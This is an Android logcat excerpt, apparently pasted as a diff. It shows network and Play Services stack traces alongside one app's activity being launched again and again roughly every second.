+12-05 18:56:01.448  6099  7111 W System.err: 	at java.net.InetAddress.getAllByName(InetAddress.java:787)
+12-05 18:56:01.448  6099  7111 W System.err: 	at com.android.okhttp.Dns$1.lookup(Dns.java:39)
+12-05 18:56:01.448  6099  7111 W System.err: 	at com.android.okhttp.internal.http.RouteSelector.resetNextInetSocketAddress(RouteSelector.java:175)
+12-05 18:56:01.448  6099  7111 W System.err: 	at com.android.okhttp.internal.http.RouteSelector.nextProxy(RouteSelector.java:141)
+12-05 18:56:01.448  6099  7111 W System.err: 	at com.android.okhttp.internal.http.RouteSelector.next(RouteSelector.java:83)
+12-05 18:56:01.448  6099  7111 W System.err: 	at com.android.okhttp.internal.http.StreamAllocation.findConnection(StreamAllocation.java:174)
+12-05 18:56:01.448  6099  7111 W System.err: 	at com.android.okhttp.internal.http.StreamAllocation.findHealthyConnection(StreamAllocation.java:126)
+12-05 18:56:01.448  6099  7111 W System.err: 	at com.android.okhttp.internal.http.StreamAllocation.newStream(StreamAllocation.java:95)
+12-05 18:56:01.448  6099  7111 W System.err: 	at com.android.okhttp.internal.http.HttpEngine.connect(HttpEngine.java:281)
+12-05 18:56:01.448  6099  7111 W System.err: 	at com.android.okhttp.internal.http.HttpEngine.sendRequest(HttpEngine.java:224)
+12-05 18:56:01.448  6099  7111 W System.err: 	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.execute(HttpURLConnectionImpl.java:461)
+12-05 18:56:01.448  6099  7111 W System.err: 	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.getResponse(HttpURLConnectionImpl.java:407)
+12-05 18:56:01.448  6099  7111 W System.err: 	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.getInputStream(HttpURLConnectionImpl.java:244)
+12-05 18:56:01.448  6099  7111 W System.err: 	at com.gnom.anton.a.a(Unknown Source:254)
+12-05 18:56:01.448  6099  7111 W System.err: 	at com.gnom.anton.a.doInBackground(Unknown Source:4)
+12-05 18:56:01.448  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:56:01.448  6099  7111 W System.err: 	at android.os.AsyncTask$2.call(AsyncTask.java:333)
+12-05 18:56:01.448  6099  7111 W System.err: 	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
+12-05 18:56:01.448  6099  7111 W System.err: 	at android.os.AsyncTask$SerialExecutor$1.run(AsyncTask.java:245)
+12-05 18:56:01.448  6099  7111 W System.err: 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:56:01.448  6099  7111 W System.err: 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:56:01.448  6099  7111 W System.err: 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:56:01.448  6099  7111 W System.err: Caused by: android.system.GaiException: android_getaddrinfo failed: EAI_NODATA (No address associated with hostname)
+12-05 18:56:01.448  6099  7111 W System.err: 	at libcore.io.Linux.android_getaddrinfo(Native Method)
+12-05 18:56:01.448  6099  7111 W System.err: 	at libcore.io.ForwardingOs.android_getaddrinfo(ForwardingOs.java:59)
+12-05 18:56:01.448  6099  7111 W System.err: 	at java.net.Inet6AddressImpl.lookupHostByName(Inet6AddressImpl.java:122)
+12-05 18:56:01.448  6099  7111 W System.err: 	... 22 more
+12-05 18:56:01.449  1641  6322 I WifiService: releaseWifiLock uid=10402
+12-05 18:56:01.479  2016  4057 I NetworkScheduler.Stats: Task com.google.android.gms/com.google.android.gms.netrec.module.NetRecGcmTaskService started execution. cause:4 exec_start_elapsed_seconds: 625 [CONTEXT service_id=218 ]
+12-05 18:56:01.485  2016  6318 I NetRec  : [293] anai.a: Refreshing scores for 1 networks.
+12-05 18:56:01.489  2016  2016 D BoundBrokerSvc: onBind: Intent { act=com.google.android.gms.phenotype.service.START cmp=com.google.android.gms/.chimera.PersistentApiService }
+12-05 18:56:01.489  2016  2016 D BoundBrokerSvc: Loading bound service for intent: Intent { act=com.google.android.gms.phenotype.service.START cmp=com.google.android.gms/.chimera.PersistentApiService }
+12-05 18:56:01.491  2186  2186 D BoundBrokerSvc: onBind: Intent { act=com.google.android.gms.auth.service.START pkg=com.google.android.gms }
+12-05 18:56:01.491  2186  2186 D BoundBrokerSvc: Loading bound service for intent: Intent { act=com.google.android.gms.auth.service.START pkg=com.google.android.gms }
+12-05 18:56:01.499  2016  2075 W GLSUser : [DeviceKeyStore] Cannot load key: Device key file not found.
+12-05 18:56:01.686  2016  2075 W GLSUser : [AppCertManager] Failed to get security token.
+12-05 18:56:01.686  2016  2075 W GLSUser : java.io.IOException: INVALID_SENDER
+12-05 18:56:01.686  2016  2075 W GLSUser : 	at aeds.f(:com.google.android.gms@204217022@20.42.17 (040700-342117392):21)
+12-05 18:56:01.686  2016  2075 W GLSUser : 	at aeds.e(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:56:01.686  2016  2075 W GLSUser : 	at aeds.d(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:56:01.686  2016  2075 W GLSUser : 	at hzb.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):13)
+12-05 18:56:01.686  2016  2075 W GLSUser : 	at hyz.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):5)
+12-05 18:56:01.686  2016  2075 W GLSUser : 	at hyz.dW(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:56:01.686  2016  2075 W GLSUser : 	at crb.onTransact(:com.google.android.gms@204217022@20.42.17 (040700-342117392):5)
+12-05 18:56:01.686  2016  2075 W GLSUser : 	at android.os.Binder.transact(Binder.java:627)
+12-05 18:56:01.686  2016  2075 W GLSUser : 	at cuy.onTransact(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:01.686  2016  2075 W GLSUser : 	at android.os.Binder.transact(Binder.java:627)
+12-05 18:56:01.686  2016  2075 W GLSUser : 	at aavv.onTransact(:com.google.android.gms@204217022@20.42.17 (040700-342117392):17)
+12-05 18:56:01.686  2016  2075 W GLSUser : 	at android.os.Binder.execTransact(Binder.java:697)
+12-05 18:56:01.807  2016  2075 W GLSUser : [AppCertManager] IOException while requesting key: 
+12-05 18:56:01.807  2016  2075 W GLSUser : java.io.IOException: Invalid device key response.
+12-05 18:56:01.807  2016  2075 W GLSUser : 	at hzb.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):44)
+12-05 18:56:01.807  2016  2075 W GLSUser : 	at hyz.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):5)
+12-05 18:56:01.807  2016  2075 W GLSUser : 	at hyz.dW(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:56:01.807  2016  2075 W GLSUser : 	at crb.onTransact(:com.google.android.gms@204217022@20.42.17 (040700-342117392):5)
+12-05 18:56:01.807  2016  2075 W GLSUser : 	at android.os.Binder.transact(Binder.java:627)
+12-05 18:56:01.807  2016  2075 W GLSUser : 	at cuy.onTransact(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:01.807  2016  2075 W GLSUser : 	at android.os.Binder.transact(Binder.java:627)
+12-05 18:56:01.807  2016  2075 W GLSUser : 	at aavv.onTransact(:com.google.android.gms@204217022@20.42.17 (040700-342117392):17)
+12-05 18:56:01.807  2016  2075 W GLSUser : 	at android.os.Binder.execTransact(Binder.java:697)
+12-05 18:56:01.808  2016  2075 W GLSUser : [DeviceKeyStore] Cannot load key: Device key file not found.
+12-05 18:56:01.820  2016  2406 E apzj    : Phenotype API error. Event # ceqj@5d5511c2, EventCode: 12 [CONTEXT service_id=51 ]
+12-05 18:56:01.820  2016  2406 E apzj    : apyo: 29503
+12-05 18:56:01.820  2016  2406 E apzj    : 	at apzp.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):25)
+12-05 18:56:01.820  2016  2406 E apzj    : 	at apzj.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):4)
+12-05 18:56:01.820  2016  2406 E apzj    : 	at apzj.fV(:com.google.android.gms@204217022@20.42.17 (040700-342117392):12)
+12-05 18:56:01.820  2016  2406 E apzj    : 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):9)
+12-05 18:56:01.820  2016  2406 E apzj    : 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:01.820  2016  2406 E apzj    : 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:56:01.820  2016  2406 E apzj    : 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:56:01.820  2016  2406 E apzj    : 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:56:01.820  2016  2406 E apzj    : 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:56:01.820  2016  2406 E apzj    : 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:56:01.820  2016  2406 E apzj    : 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:56:01.822  2016  2406 E AsyncOperation: operation=GetCommittedConfigurationOperationCall, opStatusCode=29503 [CONTEXT service_id=51 ]
+12-05 18:56:01.822  2016  2406 E AsyncOperation: OperationException[Status{statusCode=unknown status code: 29503, resolution=null}]
+12-05 18:56:01.822  2016  2406 E AsyncOperation: 	at apzj.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:56:01.822  2016  2406 E AsyncOperation: 	at apzj.fV(:com.google.android.gms@204217022@20.42.17 (040700-342117392):12)
+12-05 18:56:01.822  2016  2406 E AsyncOperation: 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):9)
+12-05 18:56:01.822  2016  2406 E AsyncOperation: 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:01.822  2016  2406 E AsyncOperation: 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:56:01.822  2016  2406 E AsyncOperation: 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:56:01.822  2016  2406 E AsyncOperation: 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:56:01.822  2016  2406 E AsyncOperation: 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:56:01.822  2016  2406 E AsyncOperation: 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:56:01.822  2016  2406 E AsyncOperation: 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:56:01.824  2016  2605 E NetRec  : [131] amxc.c: Could not retrieve server token for package com.google.android.apps.gcs
+12-05 18:56:01.824  2016  2605 E NetRec  : java.util.concurrent.ExecutionException: ryf: 29503: 
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at axac.l(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at axac.f(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at amxc.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at amxc.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at amxb.getHeaders(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at com.android.volley.toolbox.HttpClientStack.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):18)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at sym.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at bsk.executeRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at com.android.volley.toolbox.BasicNetwork.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):3)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at syn.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):17)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at com.android.volley.NetworkDispatcher.processRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):5)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at com.android.volley.NetworkDispatcher.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at com.android.volley.NetworkDispatcher.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:01.824  2016  2605 E NetRec  : Caused by: ryf: 29503: 
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at sdv.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at apyy.o(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at apzp.e(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at aaso.p(:com.google.android.gms@204217022@20.42.17 (040700-342117392):4)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):11)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:56:01.824  2016  2605 E NetRec  : 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:56:01.825  2016  2605 W NetRec  : [131] amxc.a: No server tokens extracted.
+12-05 18:56:02.102  2016  2605 E Volley  : [131] NetworkUtility.d: Unexpected response code 400 for https://mobilenetworkscoring-pa.googleapis.com/v1/GetWifiQuality?key=AIzaSyBrlVtd67QvwS_Wz0Do4ZIdOeA6ThtVczU
+12-05 18:56:02.104  2016  6318 I NetRec  : [293] anai.c: Will retry failed rapid_refresh_scores_task task as standard refresh.
+12-05 18:56:02.111  2016  6318 W NetRec  : [293] anai.a: Unexpected exception com.android.volley.ClientError while waiting for score updates (com.android.volley.ClientError). Returning 2.
+12-05 18:56:02.119  2016  6318 I NetRec  : [293] NetRecChimeraGcmTaskService.a: Still entries pending update, scheduling new rapid_refresh_scores_task refresh.
+12-05 18:56:02.125  2016  6318 I NetRec  : [293] NetRecChimeraGcmTaskService.a: Completed rapid_refresh_scores_task score refresh task in 645 ms, returning 2
+12-05 18:56:02.132  2016  4785 I NetworkScheduler.Stats: Task com.google.android.gms/com.google.android.gms.netrec.module.NetRecGcmTaskService finished executing. cause:4 result: 2 elapsed_millis: 659 uptime_millis: 659 exec_start_elapsed_seconds: 625 [CONTEXT service_id=218 ]
+12-05 18:56:02.164  2016  4785 I NetworkScheduler.Stats: Task com.google.android.gms/com.google.android.gms.auth.account.be.legacy.AuthCronService started execution. cause:5 exec_start_elapsed_seconds: 625 [CONTEXT service_id=218 ]
+12-05 18:56:02.164  2016  4785 I NetworkScheduler.Stats: Task com.google.android.gms/com.google.android.gms.auth.account.be.legacy.AuthCronService finished executing. cause:5 result: 3 elapsed_millis: 12 uptime_millis: 12 exec_start_elapsed_seconds: 625 [CONTEXT service_id=218 ]
+12-05 18:56:02.440  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:02.446  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:56:03.440  1741  1741 I chatty  : uid=10028(com.android.systemui) identical 1 line
+12-05 18:56:04.438  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:56:05.119  5398  6090 I Dialer  : VvmTaskExecutor - executing task com.android.voicemail.impl.ActivationTask@7262ff2
+12-05 18:56:05.119  5398  6090 I Dialer  : PreOMigrationHandler - ComponentInfo{com.android.phone/com.android.services.telephony.TelephonyConnectionService}, [****], UserHandle{0} already migrated
+12-05 18:56:05.134  5398  6090 I Dialer  : VvmActivationTask - VVM content provider configured - vvm_type_cvvm
+12-05 18:56:05.135  5398  6090 I Dialer  : OmtpVvmCarrierCfgHlpr - OmtpEvent:CONFIG_ACTIVATING
+12-05 18:56:05.142  5398  6090 I Dialer  : TelephonyMangerCompat.setVisualVoicemailSmsFilterSettings - using TelephonyManager
+12-05 18:56:05.143  5398  6090 I Dialer  : TelephonyMangerCompat.sendVisualVoicemailSms - using TelephonyManager
+12-05 18:56:03.436  1641  1895 I chatty  : uid=1000(system) Binder:1641_5 identical 1 line
+12-05 18:56:04.434  1641  1895 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:05.438  1641  2172 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:05.442  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:56:06.440  1641  2172 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:07.435  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:08.439  1641  2172 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:09.440  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:10.440  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:11.436  1641  2172 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:15.439  1741  1741 I chatty  : uid=10028(com.android.systemui) identical 10 lines
+12-05 18:56:16.448  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:56:16.500  1641  1654 E memtrack: Couldn't load memtrack module
+12-05 18:56:16.500  1641  1654 W android.os.Debug: failed to get memory consumption info: -1
+12-05 18:56:16.500  2186  2186 D BoundBrokerSvc: onUnbind: Intent { act=com.google.android.gms.auth.service.START pkg=com.google.android.gms }
+12-05 18:56:16.819  2016  2016 D BoundBrokerSvc: onUnbind: Intent { act=com.google.android.gms.phenotype.service.START cmp=com.google.android.gms/.chimera.PersistentApiService }
+12-05 18:56:17.445  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:56:16.446  1641  2172 I chatty  : uid=1000(system) Binder:1641_9 identical 5 lines
+12-05 18:56:17.440  1641  2172 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:18.436  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:19.435  1641  2172 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:20.437  1641  2172 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:21.442  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:22.440  1641  2172 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:23.436  1641  2172 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:24.439  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:25.443  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:26.435  1641  2172 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:27.441  1641  2950 I ActivityManager: START u0 {flg=0x10000000 cmp=com.anigilyator.org/.Annotatio} from uid 10626
+12-05 18:56:27.445  1741  1741 I chatty  : uid=10028(com.android.systemui) identical 10 lines
+12-05 18:56:28.424  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:56:29.555  6639  6646 W zygote  : Got a deoptimization request on un-deoptimizable void java.lang.Object.wait() at PC 0x71d882de
+12-05 18:56:29.717  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:56:30.439  1741  1741 I chatty  : uid=10028(com.android.systemui) identical 1 line
+12-05 18:56:31.437  1741  1741 V StatusBar: setLightsOn(true)
+12-05 18:56:32.150  2016  4785 I NetworkScheduler.Stats: Task com.google.android.gms/com.google.android.gms.netrec.module.NetRecGcmTaskService started execution. cause:4 exec_start_elapsed_seconds: 655 [CONTEXT service_id=218 ]
+12-05 18:56:32.154  2016  4785 I NetRec  : [223] anai.a: Refreshing scores for 1 networks.
+12-05 18:56:32.158  2016  2016 D BoundBrokerSvc: onBind: Intent { act=com.google.android.gms.phenotype.service.START cmp=com.google.android.gms/.chimera.PersistentApiService }
+12-05 18:56:32.158  2016  2016 D BoundBrokerSvc: Loading bound service for intent: Intent { act=com.google.android.gms.phenotype.service.START cmp=com.google.android.gms/.chimera.PersistentApiService }
+12-05 18:56:32.160  2186  2186 D BoundBrokerSvc: onBind: Intent { act=com.google.android.gms.auth.service.START pkg=com.google.android.gms }
+12-05 18:56:32.160  2186  2186 D BoundBrokerSvc: Loading bound service for intent: Intent { act=com.google.android.gms.auth.service.START pkg=com.google.android.gms }
+12-05 18:56:32.165  2016  2075 W GLSUser : [DeviceKeyStore] Cannot load key: Device key file not found.
+12-05 18:56:32.165  2016  2075 W GLSUser : [DeviceKeyStore] Cannot load key: Device key file not found.
+12-05 18:56:32.169  2016  2406 E apzj    : Phenotype API error. Event # ceqj@6c5a5ded, EventCode: 12 [CONTEXT service_id=51 ]
+12-05 18:56:32.169  2016  2406 E apzj    : apyo: 29503
+12-05 18:56:32.169  2016  2406 E apzj    : 	at apzp.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):25)
+12-05 18:56:32.169  2016  2406 E apzj    : 	at apzj.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):4)
+12-05 18:56:32.169  2016  2406 E apzj    : 	at apzj.fV(:com.google.android.gms@204217022@20.42.17 (040700-342117392):12)
+12-05 18:56:32.169  2016  2406 E apzj    : 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):9)
+12-05 18:56:32.169  2016  2406 E apzj    : 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:32.169  2016  2406 E apzj    : 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:56:32.169  2016  2406 E apzj    : 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:56:32.169  2016  2406 E apzj    : 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:56:32.169  2016  2406 E apzj    : 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:56:32.169  2016  2406 E apzj    : 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:56:32.169  2016  2406 E apzj    : 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:56:32.170  2016  2406 E AsyncOperation: operation=GetCommittedConfigurationOperationCall, opStatusCode=29503 [CONTEXT service_id=51 ]
+12-05 18:56:32.170  2016  2406 E AsyncOperation: OperationException[Status{statusCode=unknown status code: 29503, resolution=null}]
+12-05 18:56:32.170  2016  2406 E AsyncOperation: 	at apzj.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:56:32.170  2016  2406 E AsyncOperation: 	at apzj.fV(:com.google.android.gms@204217022@20.42.17 (040700-342117392):12)
+12-05 18:56:32.170  2016  2406 E AsyncOperation: 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):9)
+12-05 18:56:32.170  2016  2406 E AsyncOperation: 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:32.170  2016  2406 E AsyncOperation: 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:56:32.170  2016  2406 E AsyncOperation: 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:56:32.170  2016  2406 E AsyncOperation: 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:56:32.170  2016  2406 E AsyncOperation: 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:56:32.170  2016  2406 E AsyncOperation: 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:56:32.170  2016  2406 E AsyncOperation: 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:56:32.171  2016  2602 E NetRec  : [128] amxc.c: Could not retrieve server token for package com.google.android.apps.gcs
+12-05 18:56:32.171  2016  2602 E NetRec  : java.util.concurrent.ExecutionException: ryf: 29503: 
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at axac.l(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at axac.f(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at amxc.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at amxc.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at amxb.getHeaders(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at com.android.volley.toolbox.HttpClientStack.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):18)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at sym.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at bsk.executeRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):1)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at com.android.volley.toolbox.BasicNetwork.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):3)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at syn.performRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):17)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at com.android.volley.NetworkDispatcher.processRequest(:com.google.android.gms@204217022@20.42.17 (040700-342117392):5)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at com.android.volley.NetworkDispatcher.a(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at com.android.volley.NetworkDispatcher.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:32.171  2016  2602 E NetRec  : Caused by: ryf: 29503: 
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at sdv.b(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at apyy.o(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at apzp.e(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at aaso.p(:com.google.android.gms@204217022@20.42.17 (040700-342117392):4)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at aast.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):11)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at bozf.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):2)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at tdz.c(:com.google.android.gms@204217022@20.42.17 (040700-342117392):6)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at tdz.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):7)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at tju.run(:com.google.android.gms@204217022@20.42.17 (040700-342117392):0)
+12-05 18:56:32.171  2016  2602 E NetRec  : 	at java.lang.Thread.run(Thread.java:764)
+12-05 18:56:32.171  2016  2602 W NetRec  : [128] amxc.a: No server tokens extracted.
